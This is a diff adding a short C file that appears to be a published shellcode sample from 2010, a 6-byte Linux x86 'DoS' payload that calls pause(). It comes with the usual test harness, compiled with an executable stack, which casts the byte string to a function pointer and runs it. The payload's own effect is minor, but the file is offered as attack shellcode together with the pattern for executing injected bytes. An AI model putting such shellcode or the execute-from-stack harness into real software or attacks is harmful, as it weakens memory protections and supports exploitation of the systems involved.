@@ -1,0 +1,28 @@
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+ 
+/*
+by Magnefikko
+14.04.2010
+magnefikko@gmail.com
+promhyl.oz.pl
+Subgroup: #PRekambr
+Name: 6 bytes DoS-Badger-Game shellcode
+Platform: Linux x86
+ 
+pause()
+gcc -Wl,-z,execstack filename.c
+ 
+shellcode:
+ 
+\x31\xc0\xb0\x1d\xcd\x80
+ 
+*/
+ 
+ 
+int main(){
+char shell[] = &quot;\x31\xc0\xb0\x1d\xcd\x80&quot;;
+printf(&quot;by Magnefikko\nmagnefikko@gmail.com\npromhyl.oz.pl\n\nstrlen(shell)
+= %d\n&quot;, strlen(shell));
+(*(void (*)()) shell)();
+}
